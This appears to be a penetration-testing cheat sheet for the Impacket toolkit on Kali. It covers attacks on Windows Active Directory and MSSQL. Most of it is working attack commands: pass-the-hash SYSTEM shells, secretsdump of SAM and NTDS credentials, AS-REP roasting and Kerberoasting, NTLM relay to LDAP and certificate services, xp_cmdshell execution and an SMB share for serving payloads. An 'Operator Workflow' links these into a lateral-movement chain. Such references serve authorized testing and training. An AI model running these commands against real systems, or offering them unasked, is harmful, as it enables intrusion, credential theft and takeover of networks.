# Impacket

!!! tip "Tip"
    On Kali, use the packaged wrappers: `impacket-secretsdump`, `impacket-wmiexec`, `impacket-GetUserSPNs`, etc. Upstream help may still show the original script name in the usage line, but the Kali binaries are `impacket-<tool>`.

---
## Core Syntax

```bash
impacket-<tool> [options] [[domain/]username[:password]@]<target>
```

| Auth | Pattern |
| --- | --- |
| Domain password | `impacket-psexec 'CORP/<user>:<pass>@10.10.10.10'` |
| Local password | `impacket-wmiexec '<user>:<pass>@10.10.10.10'` |
| Pass-the-hash | `impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'` |
| Kerberos ticket | `KRB5CCNAME=<user>.ccache impacket-psexec -k -no-pass 'CORP/<user>@dc01.corp.local'` |
| AES key | `impacket-secretsdump -aesKey <aes256-key> 'CORP/<user>@dc01.corp.local'` |

!!! warning "Watch out"
    Kerberos mode needs names, not raw IPs. Put the DC/host FQDN in `/etc/hosts`, set `KRB5CCNAME` when using a ticket, and add `-dc-ip 10.10.10.10` when DNS is unreliable.

---
## SMB / File Ops

### Enumerate shares

```bash
impacket-smbclient 'CORP/<user>:<pass>@10.10.10.10'
```

```text
# shares
# use SYSVOL
# ls
# get Policies/{GUID}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf
# exit
```

### Run scripted SMB client commands

```bash
printf 'shares\nuse C$\nget Users\\Public\\loot.txt loot.txt\nexit\n' > smb.cmds
impacket-smbclient -inputfile smb.cmds 'CORP/<user>:<pass>@10.10.10.10'
```

### Host files

```bash
impacket-smbserver PWN /home/user/payloads -smb2support

# Target: copy \\10.10.14.2\PWN\payload.exe C:\Temp\payload.exe
```

---
## Remote Execution

| Tool | Use | Notes |
| --- | --- | --- |
| `impacket-psexec` | Interactive shell as `SYSTEM` | Uploads/starts a temporary service; reliable and noisy. |
| `impacket-smbexec` | Semi-interactive shell as `SYSTEM` | Service-based; useful when `psexec` is blocked. |
| `impacket-wmiexec` | Semi-interactive shell as the supplied user | WMI/DCOM; no service creation, still creates process telemetry. |
| `impacket-dcomexec` | Semi-interactive shell as the supplied user | DCOM object execution; try when WMI behavior is filtered. |
| `impacket-atexec` | One-shot command as `SYSTEM` | Scheduled task execution; good for a single command. |

### PSExec

```bash
impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10'
impacket-psexec -hashes :<ntlm-hash> 'CORP/Administrator@10.10.10.10'
impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10' 'whoami'
```

### WMIExec

```bash
impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10'
impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'
impacket-wmiexec -shell-type powershell 'CORP/<user>:<pass>@10.10.10.10'
impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10' 'ipconfig /all'
```

### Alternate exec methods

```bash
impacket-smbexec 'CORP/Administrator:Passw0rd@10.10.10.10'
impacket-atexec 'CORP/Administrator:Passw0rd@10.10.10.10' 'whoami'
impacket-dcomexec 'CORP/Administrator:Passw0rd@10.10.10.10'
```

---
## Credential Dumping

### Remote and offline dumps

```bash
# Remote SAM/LSA/NTDS where permitted
impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'

# Pass-the-hash
impacket-secretsdump -hashes :<ntlm-hash> 'CORP/Administrator@10.10.10.10'

# DC-only DRSUAPI dump
impacket-secretsdump -just-dc 'CORP/Administrator:Passw0rd@dc01.corp.local'

# Domain NTLM hashes only
impacket-secretsdump -just-dc-ntlm 'CORP/Administrator:Passw0rd@dc01.corp.local'

# Offline SAM/SYSTEM/SECURITY
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Offline NTDS.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Lightweight enumeration

```bash
impacket-samrdump 'CORP/<user>:<pass>@dc01.corp.local'
impacket-lookupsid 'CORP/<user>:<pass>@dc01.corp.local'
impacket-lookupsid 'CORP/<user>:<pass>@dc01.corp.local' 4000
impacket-netview -target 10.10.10.10 'CORP/<user>:<pass>'
```

---
## Kerberos

### AS-REP roasting

```bash
# No credentials, with a user list
impacket-GetNPUsers example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -request -format hashcat -outputfile asrep.hash

# Valid domain credentials
impacket-GetNPUsers example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -format hashcat -outputfile asrep.hash
```

### Kerberoasting

```bash
impacket-GetUserSPNs example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -outputfile tgs.hash
impacket-GetUserSPNs -k -no-pass example.com/<user> -dc-ip 10.10.10.10 -request -outputfile tgs.hash
```

### Ticket ops

```bash
impacket-getTGT example.com/<user>:'<pass>' -dc-ip 10.10.10.10
impacket-getTGT -hashes :<ntlm-hash> example.com/<user> -dc-ip 10.10.10.10
impacket-getTGT -aesKey <aes256-key> example.com/<user> -dc-ip 10.10.10.10

impacket-getST -spn cifs/dc01.example.com -impersonate Administrator example.com/<user>:'<pass>' -dc-ip 10.10.10.10
impacket-ticketConverter ticket.kirbi ticket.ccache
```

`impacket-ticketer` can forge tickets in specific key-compromise scenarios. Do not run it from a copied snippet; verify the SID, key material, SPN, and PAC requirements first.

---
## NTLM Relay

### Relay captured auth

```bash
impacket-ntlmrelayx -t smb://10.10.10.100 -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```

### LDAP relay primitives

```bash
impacket-ntlmrelayx -t ldap://dc01.example.com -smb2support --dump-laps
impacket-ntlmrelayx -t ldaps://dc01.example.com -smb2support --delegate-access
impacket-ntlmrelayx -t http://ca.example.com/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

!!! warning "Watch out"
    Relay needs a target that does not require signing or channel binding for the protocol you are attacking. Generate target lists with NetExec, then feed full URLs such as `smb://host`, `ldap://dc`, or `http://ca/certsrv/` to `-t` or `-tf`.

---
## MSSQL

```bash
# SQL auth
impacket-mssqlclient 'sa:Passw0rd@10.10.10.10'

# Windows auth
impacket-mssqlclient -windows-auth 'CORP/<user>:<pass>@10.10.10.10'

# Non-standard port
impacket-mssqlclient -port 14330 'sa:Passw0rd@10.10.10.10'
```

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

---
## High-Value Tools

```text
impacket-smbclient       SMB mini-shell
impacket-smbserver       temporary SMB share
impacket-psexec          service-based SYSTEM shell
impacket-wmiexec         WMI/DCOM semi-interactive shell
impacket-smbexec         service-based semi-interactive shell
impacket-atexec          scheduled task command execution
impacket-dcomexec        DCOM semi-interactive shell
impacket-secretsdump     SAM/LSA/NTDS dumping
impacket-samrdump        SAMR user enumeration
impacket-lookupsid       SID/RID enumeration
impacket-netview         host/session/share enumeration
impacket-GetNPUsers      AS-REP roasting
impacket-GetUserSPNs     Kerberoasting
impacket-getTGT          request TGT
impacket-getST           request service ticket / S4U flows
impacket-ntlmrelayx      NTLM relay
impacket-mssqlclient     MSSQL shell
```

---
## Cheatsheet

| Task | Command |
| --- | --- |
| SMB shell | `impacket-smbclient 'CORP/<user>:<pass>@10.10.10.10'` |
| Host payloads | `impacket-smbserver PWN /home/user/payloads -smb2support` |
| PSExec shell | `impacket-psexec 'CORP/Administrator:Passw0rd@10.10.10.10'` |
| WMIExec shell | `impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10'` |
| WMIExec command | `impacket-wmiexec 'CORP/<user>:<pass>@10.10.10.10' 'whoami'` |
| Pass-the-hash shell | `impacket-wmiexec -hashes :<ntlm-hash> 'CORP/<user>@10.10.10.10'` |
| Dump secrets | `impacket-secretsdump 'CORP/Administrator:Passw0rd@10.10.10.10'` |
| Offline SAM dump | `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL` |
| AS-REP roast | `impacket-GetNPUsers example.com/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -request -format hashcat -outputfile asrep.hash` |
| Kerberoast | `impacket-GetUserSPNs example.com/<user>:'<pass>' -dc-ip 10.10.10.10 -request -outputfile tgs.hash` |
| NTLM relay | `impacket-ntlmrelayx -tf targets.txt -smb2support -i` |
| MSSQL shell | `impacket-mssqlclient -windows-auth 'CORP/<user>:<pass>@10.10.10.10'` |

---
## Operator Workflow

```text
[0] Validate creds with NetExec.
 |
[1] Use impacket-smbclient for quick share inspection.
 |
[2] If local admin: try impacket-wmiexec first, then impacket-psexec/smbexec/atexec.
 |
[3] Dump with impacket-secretsdump only when scope and privileges justify it.
 |
[4] Run impacket-GetNPUsers / impacket-GetUserSPNs for Kerberos roast paths.
 |
[5] Build relay targets with NetExec, then run impacket-ntlmrelayx.
 |
[6] Convert/request tickets as needed; keep hostnames and Kerberos config clean.
```

!!! note "From the lab"
    Most failed Impacket Kerberos runs are name-resolution problems, not bad tickets. Use FQDN targets, set `KRB5CCNAME`, and add `-target-ip` or `-dc-ip` instead of swapping back to NTLM too early.
